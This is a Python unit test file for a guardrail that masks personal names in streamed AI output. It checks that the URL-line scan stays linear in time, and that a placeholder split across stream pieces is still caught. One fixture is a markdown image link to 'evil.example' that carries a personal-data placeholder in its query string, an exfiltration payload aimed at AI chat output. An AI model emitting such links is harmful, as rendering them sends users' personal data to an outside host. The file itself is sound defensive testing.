"""08-tam-1a r3 MAJOR-r3-2 (KARARLAR "C17 URL bağlam kuralı, ek" (c)): the URL line scan is
incremental. A stream keeps its line state and scans only the new piece with a short overlap, and
stops scanning once the line is marked or cut, so a long single-line answer read in small pieces
does not hold the API's event loop (r2 scanned the whole line again on every piece: 100,000
characters in 1-character pieces took 28 s). A piece without a placeholder pays the same small
cost."""

import asyncio
import time

import pytest

from ffcore.guardrails.masking import ContextReveal, StreamDetokenizer
from tests.unit.test_08t_c17_masking import _store_with

run = asyncio.run
NAME = "Ayşe Kaya"


def _timed(pieces, cls):
    # CPU time of this process (r5 NOTE-7): other work on the machine does not count; the r2 scan
    # needed 13 s here, the incremental one about 0.4 s.
    store, _ = _store_with([NAME])

    async def go():
        if cls is StreamDetokenizer:
            sd = StreamDetokenizer(store, "run-1")
            start = time.process_time()
            for p in pieces:
                await sd.feed(p)
            await sd.flush()
        else:
            cr = ContextReveal(store, "run-1")
            start = time.process_time()
            for p in pieces:
                await cr.data({"text": p}, stream_text=True)
        return time.process_time() - start

    return run(go())


# FOLLOWUP-165 (KARARLAR "Birim testinde mutlak süre sınırı yok", K-SEN-0015): the scan is
# proven linear by the CPU-time ratio of two input sizes (best of three; a rescan of the whole
# line on every piece is quadratic, ratio about 16 for 4x the input); the absolute bound is only
# a wide guard against hanging (r2 needed 13 s for the large input).
RATIO_LIMIT = 8.0
HANG_GUARD_S = 20.0


def _ratio(small, large, cls) -> tuple[float, float]:
    best_small = min(_timed(small, cls) for _ in range(3))
    best_large = min(_timed(large, cls) for _ in range(3))
    return best_large / max(best_small, 1e-3), best_large


@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
def test_08t_r3_long_line_in_one_character_pieces(cls):
    # no marker, no line break; 4x the characters, 4x the pieces
    ratio, large = _ratio(list("a" * 25_000), list("a" * 100_000), cls)
    assert ratio < RATIO_LIMIT, ratio
    assert large < HANG_GUARD_S


@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
def test_08t_r3_long_line_in_four_pieces(cls):
    # 16,000-character pieces of one long line: 16 against 64 (the small input is large enough
    # that the clock's resolution does not move the ratio)
    piece = "b" * 16_000
    ratio, large = _ratio([piece] * 16, [piece] * 64, cls)
    assert ratio < RATIO_LIMIT, ratio
    assert large < HANG_GUARD_S


@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
def test_08t_r3_marker_split_over_pieces_still_seen(cls):
    # The overlap keeps a marker that crosses a piece boundary, after a long unmarked prefix.
    store, _ = _store_with([NAME])
    text = "x" * 20_000 + " ![i](h" + "ttps://evil.example/?q=<<PII_1>>)"
    pieces = ["x" * 20_000 + " ![i]", "(h", "ttps://evil.example/?q=", "<<PII_1>>)"]
    assert "".join(pieces) == text

    async def go():
        if cls is StreamDetokenizer:
            sd = StreamDetokenizer(store, "run-1")
            out = [await sd.feed(p) for p in pieces]
            out.append(await sd.flush())
        else:
            cr = ContextReveal(store, "run-1")
            out = [(await cr.data({"text": p}, stream_text=True))["text"] for p in pieces]
        return "".join(out)

    assert NAME not in run(go())
